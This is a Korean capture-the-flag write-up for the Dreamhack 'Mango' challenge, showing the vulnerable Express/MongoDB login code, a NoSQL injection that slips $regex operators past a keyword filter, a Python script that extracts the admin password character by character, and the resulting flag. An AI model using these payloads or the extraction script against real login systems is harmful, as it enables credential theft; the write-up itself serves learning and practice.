https://honey-push-30b.notion.site/Mango-f2ca572187fd46a0aaec80066c37a8b0

# 문제 접근

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5d6cd350-636a-4169-bde1-c7e361ab2661/.png)

Mango 문제의 접속 정보와 문제 설명 및 문제파일을 다운로드 받을 수 있다. main.js 파일을 보면 아래 코드를 볼 수 있다.

```python
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');
```

위 코드에서 다음과 같은 정보를 알 수 있다.

1. mongoose를 사용하여 db에 접근하고 있다. 이 때 mongoose는 mongo db와 연결할 때 사용하는 것이므로 mongo db를 사용하고 있음을 알 수 있다.
2. uid가 admin일 때의 비밀번호는 DH이후 괄호 사이에 32글자의 알파벳과 숫자로 이루어진 것을 알 수 있다.
3. 요청 하는 값의 로그인이 성공하면 응답으로 result[’uid’]가 나오고 실패하면 undefined가 나온다. 즉 admin으로 로그인이 성공한다면 응답으로 admin이 나올 것이다.
4. 요청을 보낼 때 uid와 upw는 get방식으로 보낼 수 있으며 이 값은 filter만 통과하면 추가 검증이 존재하지 않는다. 이 때 filter는 admin ,dh,admi이다.

# 문제 풀이

![첫페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/89d36787-3070-4051-b245-94f1b67682aa/.png)

접속하면 위와 같은 화면을 볼 수 있으며 uid값과 upw 값을 위와 같은 get형식으로 보낼 수 있는 형태다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9b58d13b-cd55-48d0-9105-c0c10314222a/Untitled.png)

그래서 그대로 입력을 해보면 guest로 로그인이 된 것을 알 수 있다. 하지만 우리가 찾아야 하는 것은 uid가 admin일 때의 upw 값이다. 

근데 uid에 그대로 admin을 쓰면 filter로 인해 필터링 되기 때문에 다른 방법을 찾아봤다.

[https://velopert.com/479](https://velopert.com/479) 에서 찾은 비교 연산자와 정규식 연산자는 필터링이 되지 않기 때문에 이 방식으로 접근했다.

- 비교 연산자 및 정규식 연산자
    
    # **비교(Comparison) 연산자**
    
    | operator | 설명 |
    | --- | --- |
    | $eq | (equals) 주어진 값과 일치하는 값 |
    | $gt | (greater than) 주어진 값보다 큰 값 |
    | $gte | (greather than or equals) 주어진 값보다 크거나 같은 값 |
    | $lt | (less than) 주어진 값보다 작은 값 |
    | $lte | (less than or equals) 주어진 값보다 작거나 같은 값 |
    | $ne | (not equal) 주어진 값과 일치하지 않는 값 |
    | $in | 주어진 배열 안에 속하는 값 |
    | $nin | 주어빈 배열 안에 속하지 않는 값 |
    
    ****$regex 연산자****
    
    ```
    { <field>: { $regex: /pattern/, $options: '<options>' } }
    { <field>: { $regex: 'pattern', $options: '<options>' } }
    { <field>: { $regex: /pattern/<options> } }
    { <field>: /pattern/<options> }
    ```
    
    { “title” : /article0[1-2]/ }
    

그러면 이제 정규식을 이용해서 접근해보자

$regex를 이용하면 정규식을 사용할 수 있는데 정규식에 대해서 정확하게 아는 것이 아니기 때문에 다음 사이트를 참고했다.

[https://yurimkoo.github.io/analytics/2019/10/26/regular_expression.html](https://yurimkoo.github.io/analytics/2019/10/26/regular_expression.html)

이를 사용하면 테스트를 할 수 있다. 

uid[$regex]=^adm&upw[$regex]=^D 로 해보자. 이 의미는 uid가 adm으로 시작하며, upw가 D로 시작하는 경우를 의미한다. 이게 참이라면 admin이 리턴될 것이다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9276140e-6683-4bff-b269-101d1f0b7306/.png)

admin이 리턴되는 것을 봐서 필터를 우회하여 성공한 것을 알 수 있다. 그럼 이제 찾아내야 할 것은 upw의 최종값인데 upw에서도 필터링 되는 것이 dh이므로 D.{로 시작하여 알파벳과 숫자를 하나하나 대입하면서 리턴값이 admin이 나오면 참이므로 32글자를 대입해 보면서 찾아내면 된다. 

query=f"http://host3.dreamhack.games:10182/login?uid[$regex]=^adm&upw[$regex]=^D.{{{result}{ch}" 쿼리는 이렇게 작성했다.

f-string 포맷의 경우 내가 원하는 변수를 집어넣을때는 {변수명} 으로 집어넣다보니 {를 넣어주려면 {{로 두번 써줘야한다. 따라서 upw[$regex]=^D.{{{result}{ch} 는 조금더 보기 쉽게 표현하자면

^D.{+result+ch

```python
import requests

menu="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

result=''
for i in range(32):
    for ch in menu:
        query=f"http://host3.dreamhack.games:10182/login?uid[$regex]=^adm&upw[$regex]=^D.{{{result}{ch}"#{가 나오게 하려면 {를 두개쓰면 됨
        response=requests.get(query)
        if "admin" in response.text:
            result=result+ch
            break
        print("DH{"+result+"}")
print("DH{"+result+"}")
```

이 코드로 대신 노가다를 뛰면 결과값인 DH를 얻을 수 있다.

![플래그.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/257383ba-1779-4119-9a31-e06e5d943fd7/.png)

DH{89e50fa6fafe2604e33c0ba05843d3df} 를 얻을수 있다.
